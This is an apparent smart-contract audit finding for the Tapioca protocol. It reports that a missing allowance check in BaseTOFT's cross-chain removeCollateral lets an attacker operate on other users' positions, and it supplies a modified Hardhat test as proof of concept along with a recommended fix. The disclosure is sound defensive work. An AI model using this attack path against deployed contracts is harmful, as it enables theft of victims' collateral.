[H-35]BaseTOFT.sol:removeCollateralcan be used to manipulate other user’s positions and steal tokens due to absent approval check
Submitted bycarrotsmuggler, also found byKIntern_NA
The functionremoveCollateralis used to trigger a removal of collateral on a different chain. The function takes the parameterfrom, which is the account whose collateral will be sold. It also takes the parametertowhere these collateral tokens will be transferred to.
The main issue is that anyone can call this function with any address passed to thefromparameter. There is no allowance check on the chain, allowing this operation. Let’s walk through the steps to see how this is executed. Lets assume bothfromandtoare the victim’s address for reasons explained at the end.
BaseTOFT.sol:removeCollateralis called by the attacker with afromandtoaddress of the victim. This function calls theremoveCollateralfunction in the market module.
_executeModule(Module.Market,abi.encodeWithSelector(BaseTOFTMarketModule.removeCollateral.selector,from,to,lzDstChainId,zroPaymentAddress,withdrawParams,removeParams,approvals,adapterParams),false);
BaseTOFTMarketModule.sol:removeCollateralis called. This function packs some data and sends it forward to the lz endpoint. Point to note, is that no approval check is done for themsg.senderof this whole setup yet.
bytesmemorylzPayload=abi.encode(PT_MARKET_REMOVE_COLLATERAL,from,to,toAddress,removeParams,withdrawParams,approvals);// lzsend(...)
After the message is sent, thelzendpointon the receiving chain will call the TOFT contract again. Now, themsg.senderisnotthe attacker, but is instead the lzendpoint! The endpoint call gets delegated to theremovefunction in the Market module.
(,,addressto,,ITapiocaOFT.IRemoveParamsmemoryremoveParams,ICommonData.IWithdrawParamsmemorywithdrawParams,ICommonData.IApproval[]memoryapprovals) =abi.decode(_payload,(uint16,address,address,bytes32,ITapiocaOFT.IRemoveParams,ICommonData.IWithdrawParams,ICommonData.IApproval[]));
Here we see the unpacking. note that the third unpacked value is put in thetofield. This is an address determined by the attacker and passed through the layerzero endpoints. The contract then calls a market contract’sremoveCollateralfunction.
IMarket(removeParams.market).removeCollateral(to,to,removeParams.share);
Thus it is evident from this call that the Market contract being called has no idea that the original sender was the attacker. Instead, for the Market contract, themsg.senderis the current TOFT contract. If users want to use the cross chain operations, they have to give allowance to the TOFT contract address. Thus we can assume that the victim has already given allowance to this address. Thus the market thinks themsg.senderis the TOFT contract, who is allowed, and thus executes the operations.
Thus we have demonstrated that the attacker is able to call a function on the victim’s market positionwithoutbeing given any allowance by setting the victim’s address in thetofield. While it is a suspected bug that theremoveCollateralremoves collateral from thetofield’s account and not thefromfield, since both these parameters are determined by the attacker, the bug exists either way. Thus this is a high severity issue since the victim’s collateral is withdrawn, dropping their health factor.
Proof of Concept
A POC isnt provided since the test suite does not have a test for theremoveCollateralfunction. However the functionretrieveFromStrategysuffers from the same issue and has been addressed in a different report. The test for that function can be used to demonstrate this issue.
Two lines from the test in test/TapiocaOFT.test.ts is changed to show this issue. Below is the full test for reference. The changed bits are marked with arrows.
it.only("should be able to deposit & withdraw from a strategy available on another layer",async()=>{const{signer,erc20Mock,mintAndApprove,bigDummyAmount,utils,randomUser,//@audit <------------------------------------- take other user address} =awaitloadFixture(setupFixture)constLZEndpointMock_chainID_0=awaitutils.deployLZEndpointMock(31337)constLZEndpointMock_chainID_10=awaitutils.deployLZEndpointMock(10)consttapiocaWrapper_0=awaitutils.deployTapiocaWrapper()consttapiocaWrapper_10=awaitutils.deployTapiocaWrapper()//Deploy YB and StrategiesconstyieldBox0Data=awaitdeployYieldBox(signer)constyieldBox10Data=awaitdeployYieldBox(signer)constYieldBox_0=yieldBox0Data.yieldBoxconstYieldBox_10=yieldBox10Data.yieldBox{consttxData=awaittapiocaWrapper_0.populateTransaction.createTOFT(erc20Mock.address,(awaitutils.Tx_deployTapiocaOFT(LZEndpointMock_chainID_0.address,erc20Mock.address,YieldBox_0.address,31337,signer)).txData,ethers.utils.randomBytes(32),false)txData.gasLimit=awaithre.ethers.provider.estimateGas(txData)awaitsigner.sendTransaction(txData)}consttapiocaOFT0= (awaitutils.attachTapiocaOFT(awaittapiocaWrapper_0.tapiocaOFTs((awaittapiocaWrapper_0.tapiocaOFTLength()).sub(1))))asTapiocaOFT// Deploy TapiocaOFT10{consttxData=awaittapiocaWrapper_10.populateTransaction.createTOFT(erc20Mock.address,(awaitutils.Tx_deployTapiocaOFT(LZEndpointMock_chainID_10.address,erc20Mock.address,YieldBox_10.address,10,signer)).txData,ethers.utils.randomBytes(32),false)txData.gasLimit=awaithre.ethers.provider.estimateGas(txData)awaitsigner.sendTransaction(txData)}consttapiocaOFT10= (awaitutils.attachTapiocaOFT(awaittapiocaWrapper_10.tapiocaOFTs((awaittapiocaWrapper_10.tapiocaOFTLength()).sub(1))))asTapiocaOFTconststrategy0Data=awaitdeployToftMockStrategy(signer,YieldBox_0.address,tapiocaOFT0.address)conststrategy10Data=awaitdeployToftMockStrategy(signer,YieldBox_10.address,tapiocaOFT10.address)constStrategy_0=strategy0Data.tOFTStrategyMockconstStrategy_10=strategy10Data.tOFTStrategyMock// SetupawaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)// Set trusted remotesconstdstChainId0=31337constdstChainId10=10awaittapiocaWrapper_0.executeTOFT(tapiocaOFT0.address,tapiocaOFT0.interface.encodeFunctionData("setTrustedRemote", [dstChainId10,ethers.utils.solidityPack(["address","address"],[tapiocaOFT10.address,tapiocaOFT0.address]),]),true)awaittapiocaWrapper_10.executeTOFT(tapiocaOFT10.address,tapiocaOFT10.interface.encodeFunctionData("setTrustedRemote", [dstChainId0,ethers.utils.solidityPack(["address","address"],[tapiocaOFT0.address,tapiocaOFT10.address]),]),true)// Link endpoints with addressesawaitLZEndpointMock_chainID_0.setDestLzEndpoint(tapiocaOFT10.address,LZEndpointMock_chainID_10.address)awaitLZEndpointMock_chainID_10.setDestLzEndpoint(tapiocaOFT0.address,LZEndpointMock_chainID_0.address)//Register tokens on YBawaitYieldBox_0.registerAsset(1,tapiocaOFT0.address,Strategy_0.address,0)awaitYieldBox_10.registerAsset(1,tapiocaOFT10.address,Strategy_10.address,0)consttapiocaOFT0Id=awaitYieldBox_0.ids(1,tapiocaOFT0.address,Strategy_0.address,0)consttapiocaOFT10Id=awaitYieldBox_10.ids(1,tapiocaOFT10.address,Strategy_10.address,0)expect(tapiocaOFT0Id.eq(1)).to.be.trueexpect(tapiocaOFT10Id.eq(1)).to.be.true//Test deposits on same chainawaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)awaittapiocaOFT0.approve(YieldBox_0.address,ethers.constants.MaxUint256)lettoDepositShare=awaitYieldBox_0.toShare(tapiocaOFT0Id,bigDummyAmount,false)awaitYieldBox_0.depositAsset(tapiocaOFT0Id,signer.address,signer.address,0,toDepositShare)letyb0Balance=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)letvaultAmount=awaitStrategy_0.vaultAmount()expect(yb0Balance.gt(bigDummyAmount)).to.be.true//bc of the yieldexpect(vaultAmount.eq(bigDummyAmount)).to.be.true//Test withdraw on same chainawaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)awaittapiocaOFT0.transfer(Strategy_0.address,yb0Balance.sub(bigDummyAmount))//assures the strategy has enough tokens to withdrawconstsignerBalanceBeforeWithdraw=awaittapiocaOFT0.balanceOf(signer.address)consttoWithdrawShare=awaitYieldBox_0.balanceOf(signer.address,tapiocaOFT0Id)awaitYieldBox_0.withdraw(tapiocaOFT0Id,signer.address,signer.address,0,toWithdrawShare)constsignerBalanceAfterWithdraw=awaittapiocaOFT0.balanceOf(signer.address)expect(signerBalanceAfterWithdraw.sub(signerBalanceBeforeWithdraw).gt(bigDummyAmount)).to.be.truevaultAmount=awaitStrategy_0.vaultAmount()expect(vaultAmount.eq(0)).to.be.trueyb0Balance=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)expect(vaultAmount.eq(0)).to.be.trueconstlatestBalance=awaitStrategy_0.currentBalance()expect(latestBalance.eq(0)).to.be.truetoDepositShare=awaitYieldBox_0.toShare(tapiocaOFT0Id,bigDummyAmount,false)consttotals=awaitYieldBox_0.assetTotals(tapiocaOFT0Id)expect(totals[0].eq(0)).to.be.trueexpect(totals[1].eq(0)).to.be.true//Cross chain deposit from TapiocaOFT_10 to Strategy_0awaitmintAndApprove(erc20Mock,tapiocaOFT0,signer,bigDummyAmount)awaittapiocaOFT0.wrap(signer.address,signer.address,bigDummyAmount)awaitexpect(tapiocaOFT0.sendFrom(signer.address,10,ethers.utils.defaultAbiCoder.encode(["address"],[signer.address]),bigDummyAmount,{refundAddress:signer.address,zroPaymentAddress:ethers.constants.AddressZero,adapterParams:"0x",},{value:ethers.utils.parseEther("0.02"),gasLimit:2_000_000,})).to.not.be.revertedconstsignerBalanceForTOFT10=awaittapiocaOFT10.balanceOf(signer.address)expect(signerBalanceForTOFT10.eq(bigDummyAmount)).to.be.trueconstasset=awaitYieldBox_0.assets(tapiocaOFT0Id)expect(asset[2]).to.eq(Strategy_0.address)awaittapiocaOFT10.sendToStrategy(signer.address,signer.address,bigDummyAmount,toDepositShare,1,//asset iddstChainId0,{extraGasLimit:"2500000",zroPaymentAddress:ethers.constants.AddressZero,},{value:ethers.utils.parseEther("15"),})letstrategy0Amount=awaitStrategy_0.vaultAmount()expect(strategy0Amount.gt(0)).to.be.trueconstyb0BalanceAfterCrossChainDeposit=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)expect(yb0BalanceAfterCrossChainDeposit.gt(bigDummyAmount))constairdropAdapterParams=ethers.utils.solidityPack(["uint16","uint","uint","address"],[2,800000,ethers.utils.parseEther("2"),tapiocaOFT0.address])awaitYieldBox_0.setApprovalForAsset(tapiocaOFT0.address,tapiocaOFT0Id,true)//this should be done through Magnetar in the same tx, to avoid frontrunningyb0Balance=awaitYieldBox_0.amountOf(signer.address,tapiocaOFT0Id)awaittapiocaOFT0.transfer(Strategy_0.address,yb0Balance.sub(bigDummyAmount))//assures the strategy has enough tokens to withdrawawaithre.ethers.provider.send("hardhat_setBalance", [randomUser.address,ethers.utils.hexStripZeros(ethers.utils.parseEther(String(20))._hex),])//@audit <------------------------------------------- Fund userawaittapiocaOFT10.connect(randomUser)//@audit <------------------------------------------- Call with other user instead of signer.retrieveFromStrategy(signer.address,yb0BalanceAfterCrossChainDeposit,toWithdrawShare,1,dstChainId0,ethers.constants.AddressZero,airdropAdapterParams,{value:ethers.utils.parseEther("10"),})strategy0Amount=awaitStrategy_0.vaultAmount()expect(strategy0Amount.eq(0)).to.be.trueconstsignerBalanceAfterCrossChainWithdrawal=awaittapiocaOFT10.balanceOf(signer.address)expect(signerBalanceAfterCrossChainWithdrawal.gt(bigDummyAmount)).to.be.true})
The only relevant change is that the functionretrieveFromStrategyis called from another address. The test passes, showing that an attacker, in tthis caserandomUsercan influence the operations of the victim, thesigner.
Recommended Mitigation Steps
Add an allowance check for themsg.senderin theremoveCollateralfunction.
0xRektora (Tapioca) confirmed
LSDan (Judge) commented:
This attack can be summed up as “approvals are not checked when operating cross-chain.” There are several instances of this bug with varying levels of severity all reported by warden carrotsmuggler. Because they all use the same attack vector and all perform undesired/unrequested acts on behalf of other users, I have grouped them and rated this issue as high risk.